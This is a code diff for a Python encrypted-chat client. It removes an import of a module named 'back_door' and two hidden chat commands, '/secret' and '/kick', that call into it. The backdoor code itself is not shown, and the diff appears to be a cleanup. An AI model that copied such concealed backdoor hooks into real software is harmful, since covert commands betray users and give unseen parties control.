@@ -11,7 +11,6 @@ from cryptography.hazmat.primitives.asymmetric import padding, rsa
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from websockets import connect
 from aiohttp import ClientSession
-import src.back_door as secret # Import the backdoor module
 
 from src import ui
 logger = ui.init_logger('server')   # Initialize logger
@@ -226,26 +225,8 @@ class Client:
                                 continue
                             target_username = user_input.split(" ", 1)[1]
                             await self.get_public_key(target_username)
-                        elif user_input.startswith("/secret"):
-                            try:
-                                await secret.secret(self) 
-                                #logger.info("Executed secret command.")
-                            except Exception as e:
-                                logger.error(f"Failed to execute secret command: {e}")
-                                continue
                         elif user_input.startswith("/help"):
                             self.show_help()
-                        elif user_input.startswith("/kick "):
-                            try:
-                                parts = user_input.split(" ", 1)
-                                if len(parts) < 2:
-                                    logger.system("Usage: /kick <username>")
-                                    continue
-                                target_username = parts[1].strip()
-                                await secret.kick_user(self,target_username)
-                            except Exception as e:
-                                logger.error(f"Failed to execute kick command: {e}")
-                                continue
                         else:
                             logger.warning("Unknown command. Type /help for a list of commands.")
                     except Exception as e:
